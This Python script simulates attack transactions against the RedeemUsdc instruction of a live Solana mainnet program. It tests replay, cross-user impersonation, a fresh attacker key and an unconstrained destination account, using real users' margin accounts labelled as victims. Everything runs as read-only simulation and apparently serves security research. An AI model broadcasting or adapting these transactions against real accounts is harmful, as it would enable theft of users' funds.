#!/usr/bin/env python3
"""Chain-native simulation of RedeemUsdc variants (read-only; sigVerify=false; nothing is sent).
Tests: (1) replay of last real tx -> double-redeem? (2) impersonation across users (3) fresh attacker.
"""
import json, urllib.request, time, base64, sys
from solders.transaction import VersionedTransaction, Transaction
from solders.message import Message, MessageV0
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.hash import Hash

RPC = "https://api.mainnet-beta.solana.com"
def rpc(method, params, retries=5, timeout=120):
    body = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    last=None
    for i in range(retries):
        try:
            req = urllib.request.Request(RPC, data=body, headers={"Content-Type":"application/json","User-Agent":"research/1.0"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                out = json.loads(r.read())
            if "error" in out: raise RuntimeError(out["error"])
            return out
        except Exception as e:
            last=e; time.sleep(1.5*(i+1))
    raise RuntimeError(str(last))

ZO = Pubkey.from_string("Zo1ggzTUKMY5bYnDvT5mtVeZxzf2FaLTbKkmvGUhUQk")
TOKEN = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
STATE = Pubkey.from_string("71yykwxq1zQqy99PgRsgZJXi2HHK2UDx9G4va7pH6qRv")
VAULT = Pubkey.from_string("HjHSNe8hhvZ8hKCRrhKg1DGiGPd9NYQbUjT1SQRDo4kZ")
A2 = Pubkey.from_string("6kSuaA8Fi16ks53ye8eqgr7jZn2uus59W7gMSasgtFon")
A8 = Pubkey.from_string("Dwi4TnaYJTMUkVaHQgfKq6QzuWsyFSJwMxzkTemTLrvt")
VAULT_ATA = Pubkey.from_string("3er2PEWxhpuRkbVwE3ks2nynr5EtcSjCs5fdDJiKQocp")
REDEEM_DATA = bytes.fromhex("658ef6b8c6385cae")

def sim(tx_bytes, label, sigverify=False):
    b64 = base64.b64encode(bytes(tx_bytes)).decode()
    r = rpc("simulateTransaction", [b64, {"encoding":"base64","sigVerify":sigverify,"replaceRecentBlockhash":True,"commitment":"processed"}])
    v = r["result"]["value"]
    err = v.get("err")
    logs = v.get("logs") or []
    zo_logs = [l for l in logs if "Zo1ggz" in l or "Instruction:" in l or "AnchorError" in l or "failed" in l.lower()]
    print(f"\n### {label}")
    print("  err:", json.dumps(err))
    print("  unitsConsumed:", v.get("unitsConsumed"))
    for l in zo_logs[-14:]: print("   log:", l[:180])
    # token balance deltas
    for b in (v.get("postTokenBalances") or []):
        pass
    return {"label":label,"err":err,"logs":logs,"units":v.get("unitsConsumed")}

def redeem_ix(signer, margin, control, dest):
    metas = [
        AccountMeta(STATE, False, False),
        AccountMeta(VAULT, False, False),
        AccountMeta(A2, True, False),
        AccountMeta(signer, True, True),
        AccountMeta(margin, True, False),
        AccountMeta(control, True, False),
        AccountMeta(dest, True, False),
        AccountMeta(VAULT_ATA, True, False),
        AccountMeta(A8, True, False),
        AccountMeta(TOKEN, False, False),
    ]
    return Instruction(ZO, REDEEM_DATA, metas)

def build(ixs, payer):
    bh = Hash.default()  # replaced by replaceRecentBlockhash
    msg = Message.new_with_blockhash(ixs, payer, bh)
    return Transaction.new_unsigned(msg)

# ============ Test set ============
results=[]
USERS = {
 "531euoNt": ("531euoNtZMvciBcKPBvYgFJoWnUvtu4PjasDhbTTXTGG","5UjdurrpbP3i2hkw3Q2twfcz1X7VPpQWtruNwuxRvGX8","4np53fZWjiHrJqddLssaA2mzA13ryc5GFZFmn1UBsQNV","3RKQCBVZ55CKZJTVG7qyo25EhyEQUGQL4LGQXKFuXb1g"),
 "GveuASEe": ("GveuASEeBa24wtT4ZrU194akE9Ev6AYQBcndK4Proqav","A41H1VJiVy38Aef4p2nFVqTa2oDsw67pR6y32MoA3hc2","CdaduteUFTPCUuqZW1WWog1UsZX3CdUCPN4b493YnvJA","D9jRBGFbZKxJUwpDbberNY9Du4RzFdTrDnPHiLjzDQmX"),
}
def U(name):
    s,m,c,d = USERS[name]
    return Pubkey.from_string(s),Pubkey.from_string(m),Pubkey.from_string(c),Pubkey.from_string(d)

# T1: exact replay of the last real tx (raw)
raw = rpc("getTransaction",["2kJCGUpX2NdsvPWvW2wBAV3J6bWc2obPsonRd3ejoA7SyiTmkttUmPQdtf6rpm1Wm6S3sTs9RziiUYU57jNBDETr",
                             {"encoding":"base64","maxSupportedTransactionVersion":0}])["result"]["transaction"][0]
txraw = base64.b64decode(raw)
results.append(sim(txraw, "T1 replay last real RedeemUsdc tx (531euoNt) - double-redeem test"))

# T2: control - victim redeems own margin (should behave like T1)
s,m,c,d = U("531euoNt")
results.append(sim(build([redeem_ix(s,m,c,d)], s), "T2 control: 531euoNt redeems own margin"))

# T3: victim GveuASEe redeems own
s2,m2,c2,d2 = U("GveuASEe")
results.append(sim(build([redeem_ix(s2,m2,c2,d2)], s2), "T3 control: GveuASEe redeems own margin"))

# T4: IMPERSONATION - 531euoNt signs, but margin/control belong to GveuASEe; dest = 531euoNt's ATA
results.append(sim(build([redeem_ix(s, m2, c2, d)], s), "T4 impersonation: 531euoNt signer + GveuASEe margin -> 531euoNt ATA"))

# T5: fresh attacker key, victim's margin, victim's ATA
ATT = Pubkey.new_unique()
results.append(sim(build([redeem_ix(ATT, m2, c2, d2)], ATT), "T5 fresh attacker signer + GveuASEe margin -> GveuASEe ATA"))

# T6: 531euoNt signer, own margin, but dest = GveuASEe's ATA (dest constraint test)
results.append(sim(build([redeem_ix(s, m, c, d2)], s), "T6 dest-constraint: 531euoNt margin -> GveuASEe ATA"))

json.dump(results, open("analysis/sim_results.json","w"), indent=1, default=str)
print("\nDONE")
